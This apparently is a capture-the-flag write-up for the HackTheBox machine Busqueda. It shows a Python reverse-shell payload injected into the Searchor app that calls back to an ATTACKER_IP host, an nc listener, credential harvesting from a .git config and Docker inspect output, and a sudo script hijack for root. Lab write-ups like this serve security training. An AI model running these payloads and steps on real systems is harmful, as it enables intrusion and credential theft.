### Introduction

[Busqueda] is an easy CTF machine on HackTheBox focused on exploiting a **searchor** vulnerability and vuln a script code.

Let's start scanning the machine with nmap.
Like we can see, there are open the ssh port and http port.

```sh
nmap -sSV -p- -open --min-rate 5000 <IP> -oN <outputfile.txt>
```

![scan](/images/HTB/busqueda/Captura.PNG)

Let's look at the website, to see what we find.

Oh, we need to put the target IP in our ***/etc/hosts***

![no web](/images/HTB/busqueda/Captura2.PNG)

```sh
nano /etc/hosts
```

![hosts](/images/HTB/busqueda/Captura3.PNG)

Once this is done, we can now view the web page.

It seems to be a multiple search engine APP.

![Web](/images/HTB/busqueda/Captura4.PNG)

Let's research a bit about the app to see if there are vulnerabilities.

![version](/images/HTB/busqueda/Captura5.PNG)

Researching a bit, we can find a vulnerability [PoC], that can be useful to exploit it.

![PoC](/images/HTB/busqueda/Captura6.PNG)

We prepare the exploit.

```sh
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

![Exploit](/images/HTB/busqueda/Captura7.PNG)

Start a listener.

```sh
nc -lvnp 4444
```

![nc listener](/images/HTB/busqueda/Captura8.PNG)

And we execute it, if all is correct we get our reverse shell.

***If we want to upgrade to an interactive shell, we can do the following.***

```sh
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
```

![nc conn](/images/HTB/busqueda/Captura9.PNG)

We can see we are in with the user **svc**.

```sh
whoami
ls /home
```

![whoami](/images/HTB/busqueda/Captura10.PNG)

If we want to get the user flag, we can go to his home directory.

```sh
cd /home/svc
ls -la
```

![ls home](/images/HTB/busqueda/Captura11.PNG)

Now is time to start to find how to elevate our privileges.

Looking back in the **app** directory, we can find a **.git**.

```sh
cd /var/www/app
ls -la
```

![ls app](/images/HTB/busqueda/Captura12.PNG)

If we research a little, we find a **config** file with credentials.

```sh
cd .git
ls -la
cat config
```

![cody+pass](/images/HTB/busqueda/Captura13.PNG)

Let's add the site in our **/etc/hosts**.

```sh
nano /etc/hosts
```

![hosts](/images/HTB/busqueda/Captura14.PNG)

![gitea](/images/HTB/busqueda/Captura15.PNG)

We are logged in with cody, but looking up and down, we can't find anything interesting.

![cody gitea](/images/HTB/busqueda/Captura16.PNG)

Trying the password with the user **svc** it seems to be his password.

We can see that we can execute a python script with sudo.

```sh
sudo -l
```

![sudo -l](/images/HTB/busqueda/Captura17.PNG)

Let's try to execute it and see what does.

```sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py .
```

![script](/images/HTB/busqueda/Captura18.PNG)

It seems to have 3 options to launch, let's try to list the containers that are running.

We can see that there are two containers, but we are going to focus on the **gitea** one, to see if we can get the administrator credentials.

```sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

![docker-ps](/images/HTB/busqueda/Captura19.PNG)

Following the [documentation] instructions, we can get low-level information on Docker objects.

```sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
```

And we got admin credentials!

![gitea pass](/images/HTB/busqueda/Captura20.PNG)

![admin login](/images/HTB/busqueda/Captura21.PNG)

The is a scripts repository, let's inspect it.

![script code](/images/HTB/busqueda/Captura22.PNG)

Here we can find the python script code, and there is a piece of code that seems that we can vuln.

![full](/images/HTB/busqueda/Captura23.PNG)

We create a .sh script to get our root shell.

***Remember to set execute permissions***

```sh
cat full-checkup.sh
```

![cat sh](/images/HTB/busqueda/Captura24.PNG)

And execute it, if all runs correct we are in with root and can get the last flag.

```sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
ls /root/
^D
```

And with this we have finished the machine.
